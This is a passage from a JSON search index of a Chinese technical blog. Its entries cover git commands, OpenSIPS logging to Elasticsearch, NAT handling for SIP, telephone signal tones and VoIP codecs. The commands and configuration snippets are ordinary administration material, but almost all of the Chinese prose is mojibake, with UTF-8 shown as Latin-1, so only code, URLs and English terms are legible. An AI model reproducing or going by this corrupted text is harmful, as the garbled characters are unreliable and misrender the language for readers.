ªç³»åˆ—çš„ç”µè§†å‰§ã€‚\nçœ‹äº†å‰ç¬¬ä¸€é›†ä¹‹åï¼Œæ‰å‘ç°è¿™ä¸ªå‰§æ˜¯è®²è¿°å…³äºå©šå§»æ–¹é¢é—®é¢˜ç¾å‰§ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä¸å–œæ¬¢çœ‹å©šå§»é¢˜æçš„å½±è§†ã€‚ä½†æ˜¯ï¼Œä»»ä½•äº‹æƒ…éƒ½é€ƒä¸è¿‡çœŸç›¸å®šå¾‹ã€‚","title":"è‡´å‘½å¥³äºº Why Women Kill"},{"content":"git clean -n # æ‰“å°å“ªäº›æ–‡ä»¶å°†ä¼šè¢«åˆ é™¤ git clean -f # åˆ é™¤æ–‡ä»¶ git clean -fd # åˆ é™¤æ–‡ä»¶ä¸ªç›®å½• å‚è€ƒ https://stackoverflow.com/questions/61212/how-to-remove-local-untracked-files-from-the-current-git-working-tree ","permalink":"https://wdd.js.org/posts/2019/09/vccx09/","summary":"git clean -n # æ‰“å°å“ªäº›æ–‡ä»¶å°†ä¼šè¢«åˆ é™¤ git clean -f # åˆ é™¤æ–‡ä»¶ git clean -fd # åˆ é™¤æ–‡ä»¶ä¸ªç›®å½• å‚è€ƒ https://stackoverflow.com/questions/61212/how-to-remove-local-untracked-files-from-the-current-git-working-tree ","title":"git åˆ é™¤æœªè·Ÿè¸ªçš„æ–‡ä»¶"},{"content":"æ„é€ json $json(body) := \u0026#34;{}\u0026#34;; $json(body/time) = $time(%F %T-0300); $json(body/sipRequest) = â€œINVITEâ€; $json(body/ipIntruder) = $si; $json(body/destNum) = $rU; $json(body/userAgent) = $ua; $json(body/country)=$var(city); $json(body/location)=$var(latlon); $json(body/ipHost) = $Ri; ä½¿ç”¨async rest_postå†™æ•°æ® asyncå¥½åƒå­˜åœ¨äº2.1ç‰ˆæœ¬åŠå…¶ä»¥ä¸Šï¼Œ å¼‚æ­¥çš„å¥½å¤„æ˜¯ä¸ä¼šé˜»æ­¢è„šæœ¬çš„ç»§ç»­æ‰§è¡Œ async(rest_post(\u0026#34;http://user:password@w.x.y.z:9200/opensips/1\u0026#34;, \u0026#34;$json(body)\u0026#34;, \u0026#34;$var(ctype)\u0026#34;, \u0026#34;$var(ct)\u0026#34;, \u0026#34;$var(rcode)\u0026#34;),resume) ","permalink":"https://wdd.js.org/opensips/ch3/elk/","summary":"æ„é€ json $json(body) := \u0026#34;{}\u0026#34;; $json(body/time) = $time(%F %T-0300); $json(body/sipRequest) = â€œINVITEâ€; $json(body/ipIntruder) = $si; $json(body/destNum) = $rU; $json(body/userAgent) = $ua; $json(body/country)=$var(city); $json(body/location)=$var(latlon); $json(body/ipHost) = $Ri; ä½¿ç”¨async rest_postå†™æ•°æ® asyncå¥½åƒå­˜åœ¨äº2.1ç‰ˆæœ¬åŠå…¶ä»¥ä¸Šï¼Œ å¼‚æ­¥çš„å¥½å¤„æ˜¯ä¸ä¼šé˜»æ­¢è„šæœ¬çš„ç»§ç»­æ‰§è¡Œ async(rest_post(\u0026#34;http://user:password@w.x.y.z:9200/opensips/1\u0026#34;, \u0026#34;$json(body)\u0026#34;, \u0026#34;$var(ctype)\u0026#34;, \u0026#34;$var(ct)\u0026#34;, \u0026#34;$var(rcode)\u0026#34;),resume) ","title":"opensipsæ—¥å¿—å†™å…¥elasticsearch"},{"content":" https://smallpdf.com https://www.pdfpai.com/pdf-to-powerpoint ","permalink":"https://wdd.js.org/posts/2019/09/wn0a02/","summary":" https://smallpdf.com https://www.pdfpai.com/pdf-to-powerpoint ","title":"pdfè½¬pptå·¥å…·æ”¶é›†"},{"content":"ç‰¹ç‚¹åˆ†æ å›é“ƒéŸ³æœ‰ä»¥ä¸‹ç‰¹ç‚¹\nå›é“ƒéŸ³æ˜¯ç”±è¿è¥å•†é€ç»™æ‰‹æœºçš„ï¼Œè€Œä¸æ˜¯ç”±è¢«å«é€ç»™ä¸»å«çš„ã€‚ å›é“ƒéŸ³çš„æ’­æ”¾é˜¶æ®µæ˜¯åœ¨è¢«å«æ¥å¬å‰æ’­æ”¾ï¼Œè¢«å«ä¸€æ—¦æ¥å¬ï¼Œå›é“ƒéŸ³åˆ™æ’­æ”¾ç»“æŸ å›é“ƒéŸ³ä¸€èˆ¬æ˜¯450Hz, å˜Ÿä¸€ç§’ï¼Œåœ4ç§’ï¼Œ5ç§’ä¸€ä¸ªå‘¨æœŸ å¸¸è§é—®é¢˜ å¬ä¸åˆ°å›é“ƒéŸ³ ã€ç°è±¡ã€‘æ‰“åŒä¸€ä¸ªå·ç ï¼Œæœ‰äº›æ‰‹æœºèƒ½å¬åˆ°å›é“ƒéŸ³ï¼Œæœ‰äº›æ‰‹æœºå¬ä¸åˆ°å›é“ƒéŸ³ã€æ’æŸ¥æ€è·¯ã€‘\næœ‰äº›æ‰‹æœºvolteå¼€å¯åï¼Œå¯èƒ½ä¼šå¯¼è‡´æ— å›é“ƒéŸ³ï¼Œæ‰€ä»¥å¯ä»¥å…³é—­volteè¯•è¯• è¢«å«çš„è¿è¥å•†ï¼Œä¸»å«æ‰‹æœºçš„è¿è¥å•† å‚è€ƒèµ„æ–™ https://zh.wikipedia.org/wiki/%E5%9B%9E%E9%93%83%E9%9F%B3 https://baike.baidu.com/item/%E5%9B%9E%E9%93%83%E9%9F%B3/1014322 http://www.it9000.cn/tech/CTI/signal.html ","permalink":"https://wdd.js.org/opensips/ch2/early-media/","summary":"ç‰¹ç‚¹åˆ†æ å›é“ƒéŸ³æœ‰ä»¥ä¸‹ç‰¹ç‚¹\nå›é“ƒéŸ³æ˜¯ç”±è¿è¥å•†é€ç»™æ‰‹æœºçš„ï¼Œè€Œä¸æ˜¯ç”±è¢«å«é€ç»™ä¸»å«çš„ã€‚ å›é“ƒéŸ³çš„æ’­æ”¾é˜¶æ®µæ˜¯åœ¨è¢«å«æ¥å¬å‰æ’­æ”¾ï¼Œè¢«å«ä¸€æ—¦æ¥å¬ï¼Œå›é“ƒéŸ³åˆ™æ’­æ”¾ç»“æŸ å›é“ƒéŸ³ä¸€èˆ¬æ˜¯450Hz, å˜Ÿä¸€ç§’ï¼Œåœ4ç§’ï¼Œ5ç§’ä¸€ä¸ªå‘¨æœŸ å¸¸è§é—®é¢˜ å¬ä¸åˆ°å›é“ƒéŸ³ ã€ç°è±¡ã€‘æ‰“åŒä¸€ä¸ªå·ç ï¼Œæœ‰äº›æ‰‹æœºèƒ½å¬åˆ°å›é“ƒéŸ³ï¼Œæœ‰äº›æ‰‹æœºå¬ä¸åˆ°å›é“ƒéŸ³ã€æ’æŸ¥æ€è·¯ã€‘\næœ‰äº›æ‰‹æœºvolteå¼€å¯åï¼Œå¯èƒ½ä¼šå¯¼è‡´æ— å›é“ƒéŸ³ï¼Œæ‰€ä»¥å¯ä»¥å…³é—­volteè¯•è¯• è¢«å«çš„è¿è¥å•†ï¼Œä¸»å«æ‰‹æœºçš„è¿è¥å•† å‚è€ƒèµ„æ–™ https://zh.wikipedia.org/wiki/%E5%9B%9E%E9%93%83%E9%9F%B3 https://baike.baidu.com/item/%E5%9B%9E%E9%93%83%E9%9F%B3/1014322 http://www.it9000.cn/tech/CTI/signal.html ","title":"å›é“ƒéŸ³"},{"content":"å‡ ç§å¸¸ç”¨ç”µè¯ä¿¡å·éŸ³çš„å«ä¹‰ ä¿¡å·é¢‘ç‡ï¼šï¼ˆ450Â±25ï¼‰HZï¼šæ‹¨å·éŸ³ã€å›é“ƒéŸ³ã€å¿™éŸ³ã€é•¿é€”é€šçŸ¥éŸ³ã€ç©ºå·éŸ³ï¼ˆ950Â±25ï¼‰HZï¼šå‚¬æŒ‚éŸ³\næ‹¨å·éŸ³ æ‘˜æœºåå—è¯å™¨ä¸­ä¾¿æœ‰ä¸€ç§â€œå—¡\u0026ndash;â€çš„è¿ç»­éŸ³ï¼Œè¿™ç§å£°éŸ³å°±æ˜¯æ‹¨å·éŸ³ï¼Œå®ƒè¡¨ç¤ºè‡ªåŠ¨äº¤æ¢æœºæˆ–å¯¹æ–¹å‘¼å«ä¸­å¿ƒç³»ç»Ÿå·²ç»åšå¥½äº†æ¥ç»­å‡†å¤‡ï¼Œå…è®¸ç”¨æˆ·æ‹¨å·\nå›é“ƒéŸ³ æ‹¨å®Œè¢«å«å·ï¼Œè‹¥å¬åˆ°â€œå˜Ÿ\u0026ndash;å˜Ÿ\u0026ndash;â€çš„æ–­ç»­éŸ³ï¼ˆå“1sï¼Œæ–­4sï¼‰ï¼Œä¾¿æ˜¯å›é“ƒéŸ³ï¼Œè¡¨ç¤ºè¢«å«è¯æœºæ­£åœ¨å“é“ƒï¼Œå¯é™å€™æ¥è¯ï¼›å¦‚æœæŒ¯é“ƒè¶…è¿‡10ä½™æ¬¡ï¼Œä»æ— äººè®²è¯ï¼Œè¯´æ˜å¯¹æ–¹æ— äººæ¥ç”µè¯ï¼Œåº”æ”¾å¥½æ‰‹æŸ„ç¨åå†æ‹¨ã€‚\nå¿™éŸ³ å½“ä¸»å«ç”¨æˆ·åœ¨æ‹¨å·è¿‡ç¨‹ä¸­æˆ–æ‹¨å®Œè¢«å«ç”µè¯å·ç åï¼Œè‹¥å¬åˆ°â€œå˜Ÿã€å˜Ÿã€å˜Ÿâ€¦â€¦â€çš„çŸ­ä¿ƒéŸ³ï¼ˆå“0.35sï¼Œæ–­0.35sï¼‰ï¼Œè¿™å°±æ˜¯å¿™éŸ³ï¼Œè¡¨ç¤ºçº¿è·¯å·²ç»è¢«å æ»¡æˆ–è¢«å«ç”µè¯æœºæ­£åœ¨ä½¿ç”¨\né•¿é€”é€šçŸ¥éŸ³ å½“ä¸»å«ç”¨æˆ·å’Œè¢«å«ç”¨æˆ·æ­£åœ¨è¿›è¡Œå¸‚å†…é€šè¯æ—¶ï¼Œå¬åˆ°â€œå˜Ÿã€å˜Ÿã€å˜Ÿâ€¦â€¦â€çš„çŸ­ä¿ƒéŸ³ï¼ˆå“0.2sï¼Œæ–­0.2sï¼Œå“0.2sï¼Œé—´æ­‡0.6sï¼‰ï¼Œè¿™ä¾¿æ˜¯é•¿é€”ç”µè¯é€šçŸ¥éŸ³ï¼Œè¡¨ç¤ºæœ‰é•¿é€”ç”µè¯æ’å…¥ï¼Œæé†’ä¸»è¢«å«ç”¨æˆ·åŒæ–¹å°½å¿«ç»“æŸå¸‚å†…é€šè¯ï¼Œå‡†å¤‡æ¥å¬é•¿é€”ç”µè¯ã€‚\nç©ºå·éŸ³ å½“ç”¨æˆ·æ‹¨å®Œå·ç åå¬åˆ°ä¸ç­‰é—´éš”æ–­ç»­ä¿¡å·éŸ³ï¼ˆé‡å¤3æ¬¡0.1så“ï¼Œ0.1sæ–­åï¼Œ0.4så“0.4sæ–­ï¼‰ï¼Œè¿™ä¾¿æ˜¯ç©ºå·éŸ³ï¼Œè¡¨ç¤ºé€šçŸ¥ä¸»å«ç”¨æˆ·æ‰€å‘¼å«çš„è¢«å«å·ç ä¸ºç©ºå·æˆ–å—é™åˆ¶çš„å·ç ã€‚\nå‚¬æŒ‚éŸ³ å¦‚æœç”¨æˆ·å¬åˆ°è¿ç»­ä¿¡å·éŸ³ï¼Œå“åº¦å˜åŒ–ä¸º5çº§ï¼Œç”±ä½çº§é€æ­¥å‡é«˜ï¼Œåˆ™æ˜¯å‚¬æŒ‚éŸ³ã€‚é€šçŸ¥ä¹…ä¸æŒ‚æœºçš„ç”¨æˆ·è¿…é€ŸæŒ‚æœºã€‚\nå‚è€ƒ http://www.it9000.cn/tech/CTI/signal.html ","permalink":"https://wdd.js.org/opensips/ch2/early-media-type/","summary":"å‡ ç§å¸¸ç”¨ç”µè¯ä¿¡å·éŸ³çš„å«ä¹‰ ä¿¡å·é¢‘ç‡ï¼šï¼ˆ450Â±25ï¼‰HZï¼šæ‹¨å·éŸ³ã€å›é“ƒéŸ³ã€å¿™éŸ³ã€é•¿é€”é€šçŸ¥éŸ³ã€ç©ºå·éŸ³ï¼ˆ950Â±25ï¼‰HZï¼šå‚¬æŒ‚éŸ³\næ‹¨å·éŸ³ æ‘˜æœºåå—è¯å™¨ä¸­ä¾¿æœ‰ä¸€ç§â€œå—¡\u0026ndash;â€çš„è¿ç»­éŸ³ï¼Œè¿™ç§å£°éŸ³å°±æ˜¯æ‹¨å·éŸ³ï¼Œå®ƒè¡¨ç¤ºè‡ªåŠ¨äº¤æ¢æœºæˆ–å¯¹æ–¹å‘¼å«ä¸­å¿ƒç³»ç»Ÿå·²ç»åšå¥½äº†æ¥ç»­å‡†å¤‡ï¼Œå…è®¸ç”¨æˆ·æ‹¨å·\nå›é“ƒéŸ³ æ‹¨å®Œè¢«å«å·ï¼Œè‹¥å¬åˆ°â€œå˜Ÿ\u0026ndash;å˜Ÿ\u0026ndash;â€çš„æ–­ç»­éŸ³ï¼ˆå“1sï¼Œæ–­4sï¼‰ï¼Œä¾¿æ˜¯å›é“ƒéŸ³ï¼Œè¡¨ç¤ºè¢«å«è¯æœºæ­£åœ¨å“é“ƒï¼Œå¯é™å€™æ¥è¯ï¼›å¦‚æœæŒ¯é“ƒè¶…è¿‡10ä½™æ¬¡ï¼Œä»æ— äººè®²è¯ï¼Œè¯´æ˜å¯¹æ–¹æ— äººæ¥ç”µè¯ï¼Œåº”æ”¾å¥½æ‰‹æŸ„ç¨åå†æ‹¨ã€‚\nå¿™éŸ³ å½“ä¸»å«ç”¨æˆ·åœ¨æ‹¨å·è¿‡ç¨‹ä¸­æˆ–æ‹¨å®Œè¢«å«ç”µè¯å·ç åï¼Œè‹¥å¬åˆ°â€œå˜Ÿã€å˜Ÿã€å˜Ÿâ€¦â€¦â€çš„çŸ­ä¿ƒéŸ³ï¼ˆå“0.35sï¼Œæ–­0.35sï¼‰ï¼Œè¿™å°±æ˜¯å¿™éŸ³ï¼Œè¡¨ç¤ºçº¿è·¯å·²ç»è¢«å æ»¡æˆ–è¢«å«ç”µè¯æœºæ­£åœ¨ä½¿ç”¨\né•¿é€”é€šçŸ¥éŸ³ å½“ä¸»å«ç”¨æˆ·å’Œè¢«å«ç”¨æˆ·æ­£åœ¨è¿›è¡Œå¸‚å†…é€šè¯æ—¶ï¼Œå¬åˆ°â€œå˜Ÿã€å˜Ÿã€å˜Ÿâ€¦â€¦â€çš„çŸ­ä¿ƒéŸ³ï¼ˆå“0.2sï¼Œæ–­0.2sï¼Œå“0.2sï¼Œé—´æ­‡0.6sï¼‰ï¼Œè¿™ä¾¿æ˜¯é•¿é€”ç”µè¯é€šçŸ¥éŸ³ï¼Œè¡¨ç¤ºæœ‰é•¿é€”ç”µè¯æ’å…¥ï¼Œæé†’ä¸»è¢«å«ç”¨æˆ·åŒæ–¹å°½å¿«ç»“æŸå¸‚å†…é€šè¯ï¼Œå‡†å¤‡æ¥å¬é•¿é€”ç”µè¯ã€‚\nç©ºå·éŸ³ å½“ç”¨æˆ·æ‹¨å®Œå·ç åå¬åˆ°ä¸ç­‰é—´éš”æ–­ç»­ä¿¡å·éŸ³ï¼ˆé‡å¤3æ¬¡0.1så“ï¼Œ0.1sæ–­åï¼Œ0.4så“0.4sæ–­ï¼‰ï¼Œè¿™ä¾¿æ˜¯ç©ºå·éŸ³ï¼Œè¡¨ç¤ºé€šçŸ¥ä¸»å«ç”¨æˆ·æ‰€å‘¼å«çš„è¢«å«å·ç ä¸ºç©ºå·æˆ–å—é™åˆ¶çš„å·ç ã€‚\nå‚¬æŒ‚éŸ³ å¦‚æœç”¨æˆ·å¬åˆ°è¿ç»­ä¿¡å·éŸ³ï¼Œå“åº¦å˜åŒ–ä¸º5çº§ï¼Œç”±ä½çº§é€æ­¥å‡é«˜ï¼Œåˆ™æ˜¯å‚¬æŒ‚éŸ³ã€‚é€šçŸ¥ä¹…ä¸æŒ‚æœºçš„ç”¨æˆ·è¿…é€ŸæŒ‚æœºã€‚\nå‚è€ƒ http://www.it9000.cn/tech/CTI/signal.html ","title":"å‡ ç§å¸¸ç”¨ç”µè¯ä¿¡å·éŸ³çš„å«ä¹‰"},{"content":"é—®é¢˜æè¿° è¿æ¥æœåŠ¡å™¨æ—¶çš„æŠ¥è­¦\n-bash: è­¦å‘Š:setlocale: LC_CTYPE: æ— æ³•æ”¹å˜åŒºåŸŸé€‰é¡¹ (UTF-8): æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• git status å‘ç°æœ¬æ¥åº”è¯¥æ˜¾ç¤º \u0026lsquo;on brance master\u0026rsquo; ä¹‹ç±»çš„åœ°æ–¹ï¼Œå±…ç„¶è‹±æ–‡ä¹Ÿä¹±ç äº†ï¼Œéƒ½æ˜¯é—®å·ã€‚\nè§£å†³æ–¹æ¡ˆ vim /etc/environment , ç„¶ååŠ å…¥å¦‚ä¸‹ä»£ç ï¼Œç„¶åé‡æ–°æ‰“å¼€sshçª—å£\nLC_ALL=en_US.UTF-8 LANG=en_US.UTF-8 ","permalink":"https://wdd.js.org/posts/2019/09/msx8i9/","summary":"é—®é¢˜æè¿° è¿æ¥æœåŠ¡å™¨æ—¶çš„æŠ¥è­¦\n-bash: è­¦å‘Š:setlocale: LC_CTYPE: æ— æ³•æ”¹å˜åŒºåŸŸé€‰é¡¹ (UTF-8): æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• git status å‘ç°æœ¬æ¥åº”è¯¥æ˜¾ç¤º \u0026lsquo;on brance master\u0026rsquo; ä¹‹ç±»çš„åœ°æ–¹ï¼Œå±…ç„¶è‹±æ–‡ä¹Ÿä¹±ç äº†ï¼Œéƒ½æ˜¯é—®å·ã€‚\nè§£å†³æ–¹æ¡ˆ vim /etc/environment , ç„¶ååŠ å…¥å¦‚ä¸‹ä»£ç ï¼Œç„¶åé‡æ–°æ‰“å¼€sshçª—å£\nLC_ALL=en_US.UTF-8 LANG=en_US.UTF-8 ","title":"Royal TSX git status è¾“å‡ºä¹±ç "},{"content":"git config --global --unset http.proxy ","permalink":"https://wdd.js.org/posts/2019/09/yko32n/","summary":"git config --global --unset http.proxy ","title":"gitå–æ¶ˆè®¾ç½®httpä»£ç†"},{"content":"è§£å†³ä¿¡ä»¤çš„è¿‡ç¨‹ NATæ£€æµ‹ ä½¿ç”¨rportè§£å†³Via åœ¨åˆå§‹åŒ–è¯·æ±‚å’Œå“åº”ä¸­ä¿®æ”¹Contactå¤´ å¤„ç†æ¥è‡ªNATå†…éƒ¨çš„æ³¨å†Œè¯·æ±‚ Pingå®¢æˆ·ç«¯ä½¿NATæ˜ å°„ä¿æŒæ‰“å¼€ å¤„ç†åºåˆ—åŒ–è¯·æ±‚ å®ç°NATæ£€æµ‹Â nat_uac_test ä½¿ç”¨å‡½æ•° nat_uac_test\n1 æœç´¢Contactå¤´å­˜åœ¨äºRFC 1918 ä¸­çš„åœ°å€ 2 æ£€æµ‹Viaå¤´ä¸­çš„receivedå‚æ•°å’Œæºåœ°å€æ˜¯å¦ç›¸åŒ 4 æœ€é¡¶éƒ¨çš„Viaå‡ºç°åœ¨RFC1918 / RFC6598åœ°å€ä¸­ 8 æœç´¢SDPå¤´å‡ºç°RFC1918 / RFC6598åœ°å€ 16 æµ‹è¯•æºç«¯å£æ˜¯å¦å’ŒViaå¤´ä¸­çš„ç«¯å£ä¸åŒ 32 æ¯”è¾ƒContactä¸­çš„åœ°å€å’Œæºä¿¡ä»¤çš„åœ°å€ 64 æ¯”è¾ƒContactä¸­çš„ç«¯å£å’Œæºä¿¡ä»¤çš„ç«¯å£ ä¸Šè¾¹çš„æµ‹è¯•éƒ½æ˜¯å¯ä»¥ç»„åˆçš„ï¼Œå¹¶ä¸”ä»»ä½•ä¸€ä¸ªæµ‹è¯•é€šè¿‡ï¼Œåˆ™è¿”å›trueã€‚\nä¾‹å¦‚ä¸‹é¢çš„æµ‹è¯•19ï¼Œå®é™…ä¸Šæ˜¯1+2+16ä¸‰é¡¹æµ‹è¯•çš„ç»„åˆ\nnat_uac_test(\u0026#34;19\u0026#34;) ä½¿ç”¨rportå’Œreceiveå‚æ•°æ ‡è®°Viaå¤´ ä»NATå†…éƒ¨å‡ºå»çš„å‘¼å«ï¼Œå¾€å¾€å¯èƒ½ä¸çŸ¥é“è‡ªå·±çš„å‡ºå£IPå’Œç«¯å£ï¼Œåªæœ‰è¿œç«¯çš„SIPæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œæ‰èƒ½çŸ¥é“UACçš„çœŸæ˜¯å‡ºå£IPå’Œç«¯å£ã€‚å‡ºå£IPç”¨received=x.x.x.xï¼Œå‡ºå£ç«¯å£ç”¨rport=xxã€‚å½“æœ‰æ¶ˆæ¯å‘åˆ°UACæ—¶ï¼Œåº”å½“å‘åˆ°receivedå’Œrportæ‰€æŒ‡å®šçš„åœ°å€å’Œç«¯å£ã€‚\n# åŸå§‹çš„Via Via: SIP/2.0/UDP 192.168.4.48:5062;branch=z9hG4bK523223793;rport # ç»è¿‡opensipså¤„ç†åçš„Via Via: SIP/2.0/UDP 192.168.4.48:5062;received=192.168.4.48;branch=z9hG4bK523223793;rport=5062 ä¿®å¤Contactå¤´ Viaå¤´å’ŒContactå¤´æ˜¯æ¯”è¾ƒå®¹æ˜“æ··æ·†çš„æ¦‚å¿µï¼Œä½†æ˜¯ä¸¤è€…çš„åŠŸèƒ½å®Œå…¨ä¸åŒã€‚Viaå¤´ä½¿ç”¨æ¥å¯¼èˆª183å’Œ200å“åº”åº”è¯¥å¦‚ä½•æŒ‰ç…§åŸè·¯è¿”å›ã€‚Contactç”¨æ¥ç»™åºåˆ—åŒ–è¯·æ±‚ï¼Œä¾‹å¦‚BYEå’ŒUPDATEå¯¼èˆªã€‚å¦‚æœContactå¤´ä¸æ­£ç¡®ï¼Œå¯èƒ½ä¼šå¯¼è‡´å‘¼å«æ— æ³•æŒ‚æ–­ã€‚é‚£ä¹ˆå°±éœ€è¦ç”¨fix_nated_contact()å‡½æ•°å»ä¿®å¤Contactå¤´ã€‚å¦å¤–ï¼Œå¯¹äº183å’Œ200çš„å“åº”ä¹Ÿéœ€è¦å»ä¿®å¤Contactå¤´ã€‚\nå¤„ç†æ³¨å†Œè¯·æ±‚ RFC 1918 åœ°å€ç»„ 10.0.0.0 - 10.255.255.255 (10/8 prefix) 172.16.0.0 - 172.31.255.255 (172.16/12 prefix) 192.168.0.0 - 192.168.255.255 (192.168/16 prefix) å‚è€ƒ http://www.rfcreader.com/#rfc1918 ","permalink":"https://wdd.js.org/opensips/ch1/fix-nat/","summary":"è§£å†³ä¿¡ä»¤çš„è¿‡ç¨‹ NATæ£€æµ‹ ä½¿ç”¨rportè§£å†³Via åœ¨åˆå§‹åŒ–è¯·æ±‚å’Œå“åº”ä¸­ä¿®æ”¹Contactå¤´ å¤„ç†æ¥è‡ªNATå†…éƒ¨çš„æ³¨å†Œè¯·æ±‚ Pingå®¢æˆ·ç«¯ä½¿NATæ˜ å°„ä¿æŒæ‰“å¼€ å¤„ç†åºåˆ—åŒ–è¯·æ±‚ å®ç°NATæ£€æµ‹Â nat_uac_test ä½¿ç”¨å‡½æ•° nat_uac_test\n1 æœç´¢Contactå¤´å­˜åœ¨äºRFC 1918 ä¸­çš„åœ°å€ 2 æ£€æµ‹Viaå¤´ä¸­çš„receivedå‚æ•°å’Œæºåœ°å€æ˜¯å¦ç›¸åŒ 4 æœ€é¡¶éƒ¨çš„Viaå‡ºç°åœ¨RFC1918 / RFC6598åœ°å€ä¸­ 8 æœç´¢SDPå¤´å‡ºç°RFC1918 / RFC6598åœ°å€ 16 æµ‹è¯•æºç«¯å£æ˜¯å¦å’ŒViaå¤´ä¸­çš„ç«¯å£ä¸åŒ 32 æ¯”è¾ƒContactä¸­çš„åœ°å€å’Œæºä¿¡ä»¤çš„åœ°å€ 64 æ¯”è¾ƒContactä¸­çš„ç«¯å£å’Œæºä¿¡ä»¤çš„ç«¯å£ ä¸Šè¾¹çš„æµ‹è¯•éƒ½æ˜¯å¯ä»¥ç»„åˆçš„ï¼Œå¹¶ä¸”ä»»ä½•ä¸€ä¸ªæµ‹è¯•é€šè¿‡ï¼Œåˆ™è¿”å›trueã€‚\nä¾‹å¦‚ä¸‹é¢çš„æµ‹è¯•19ï¼Œå®é™…ä¸Šæ˜¯1+2+16ä¸‰é¡¹æµ‹è¯•çš„ç»„åˆ\nnat_uac_test(\u0026#34;19\u0026#34;) ä½¿ç”¨rportå’Œreceiveå‚æ•°æ ‡è®°Viaå¤´ ä»NATå†…éƒ¨å‡ºå»çš„å‘¼å«ï¼Œå¾€å¾€å¯èƒ½ä¸çŸ¥é“è‡ªå·±çš„å‡ºå£IPå’Œç«¯å£ï¼Œåªæœ‰è¿œç«¯çš„SIPæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œæ‰èƒ½çŸ¥é“UACçš„çœŸæ˜¯å‡ºå£IPå’Œç«¯å£ã€‚å‡ºå£IPç”¨received=x.x.x.xï¼Œå‡ºå£ç«¯å£ç”¨rport=xxã€‚å½“æœ‰æ¶ˆæ¯å‘åˆ°UACæ—¶ï¼Œåº”å½“å‘åˆ°receivedå’Œrportæ‰€æŒ‡å®šçš„åœ°å€å’Œç«¯å£ã€‚\n# åŸå§‹çš„Via Via: SIP/2.0/UDP 192.168.4.48:5062;branch=z9hG4bK523223793;rport # ç»è¿‡opensipså¤„ç†åçš„Via Via: SIP/2.0/UDP 192.168.4.48:5062;received=192.168.4.48;branch=z9hG4bK523223793;rport=5062 ä¿®å¤Contactå¤´ Viaå¤´å’ŒContactå¤´æ˜¯æ¯”è¾ƒå®¹æ˜“æ··æ·†çš„æ¦‚å¿µï¼Œä½†æ˜¯ä¸¤è€…çš„åŠŸèƒ½å®Œå…¨ä¸åŒã€‚Viaå¤´ä½¿ç”¨æ¥å¯¼èˆª183å’Œ200å“åº”åº”è¯¥å¦‚ä½•æŒ‰ç…§åŸè·¯è¿”å›ã€‚Contactç”¨æ¥ç»™åºåˆ—åŒ–è¯·æ±‚ï¼Œä¾‹å¦‚BYEå’ŒUPDATEå¯¼èˆªã€‚å¦‚æœContactå¤´ä¸æ­£ç¡®ï¼Œå¯èƒ½ä¼šå¯¼è‡´å‘¼å«æ— æ³•æŒ‚æ–­ã€‚é‚£ä¹ˆå°±éœ€è¦ç”¨fix_nated_contact()å‡½æ•°å»ä¿®å¤Contactå¤´ã€‚å¦å¤–ï¼Œå¯¹äº183å’Œ200çš„å“åº”ä¹Ÿéœ€è¦å»ä¿®å¤Contactå¤´ã€‚\nå¤„ç†æ³¨å†Œè¯·æ±‚ RFC 1918 åœ°å€ç»„ 10.0.0.0 - 10.255.255.255 (10/8 prefix) 172.16.0.0 - 172.31.255.255 (172.16/12 prefix) 192.168.0.0 - 192.168.255.255 (192.168/16 prefix) å‚è€ƒ http://www.rfcreader.com/#rfc1918 ","title":"NATè§£å†³æ–¹æ³•"},{"content":" ç¼–ç  å¸¦å®½ MOS ç¯å¢ƒ ç‰¹ç‚¹ è¯´æ˜ G.711 64 kbps 4.45 LAN/WAN è¯­éŸ³è´¨é‡é«˜ï¼Œé€‚åˆå¯¹æ¥ç½‘å…³ G.711å®é™…ä¸Šå°±æ˜¯PCM, æ˜¯æœ€åŸºæœ¬çš„ç¼–ç æ–¹å¼ã€‚PCMåˆåˆ†ä¸ºä¸¤ç±»PCMA(g711a), PCMU(g711u)ã€‚ä¸­å›½ä½¿ç”¨çš„æ˜¯PCMA G.729 8 kbps 4.04 WAN å¸¦å®½å ç”¨ç‡å¾ˆå°ï¼ŒåŒæ—¶èƒ½ä¿è¯ä¸é”™çš„è¯­éŸ³è´¨é‡ åˆ†ä¸ºG729aå’ŒG729bä¸¤ç§ï¼ŒG729ä¹‹æ‰€ä»¥å¸¦å®½å ç”¨æ˜¯G711çš„1/8, æ˜¯å› ä¸ºG729çš„å‹ç¼©ç®—æ³•ä¸åŒã€‚G729ä¼ è¾“çš„ä¸æ˜¯çœŸæ­£çš„è¯­éŸ³ï¼Œè€Œæ˜¯è¯­éŸ³å‹ç¼©åçš„ç»“æœã€‚G729çš„ç¼–è§£ç æ˜¯ç”±ä¸“åˆ©çš„ï¼Œä¹Ÿå°±è¯´ä¸å…è´¹ã€‚ G.722 64 kbps 4.5 LAN è¯­éŸ³è´¨é‡é«˜ HD hdè¯­éŸ³ GSM 13.3 kbps 3.01 iLBA 13.3 15.2 æŠ—ä¸¢åŒ… OPUS 6-510 kbps - INTERNET OPUSçš„å¸¦å®½èŒƒå›´è·¨åº¦å¾ˆå¹¿ï¼Œé€‚åˆè¯­éŸ³å’Œè§†å± MOSå€¼ï¼ŒMean Opinion Scoreï¼Œç”¨æ¥å®šä¹‰è¯­éŸ³è´¨é‡ã€‚æ»¡åˆ†ä¸º5åˆ†ï¼Œæœ€ä½1åˆ†ã€‚\nMOS è´¨é‡ 5 æå¥½çš„ 4 ä¸é”™çš„ 3 è¿˜è¡Œå§ 2 ä¸­ç­‰å·® 1 æœ€å·® é€šå¸¸çš„æ‰“åŒ…æ˜¯20msä¸€ä¸ªåŒ…ï¼Œé‚£ä¹ˆä¸€ç§’å°±ä¼šä¼ è¾“1000/20=50ä¸ªåŒ…ã€‚å¦‚æœé‡‡æ ·è¯„ç‡æ˜¯8000Hz,Â é‚£ä¹ˆæ¯ä¸ªåŒ…çš„ä¼šæºå¸¦ 8000/50=160ä¸ªé‡‡æ ·æ•°æ®ã€‚åœ¨PCMAæˆ–è€…PCMUä¸­ï¼Œæ¯ä¸ªé‡‡æ ·æ•°æ®å ç”¨1å­—èŠ‚ã€‚å› 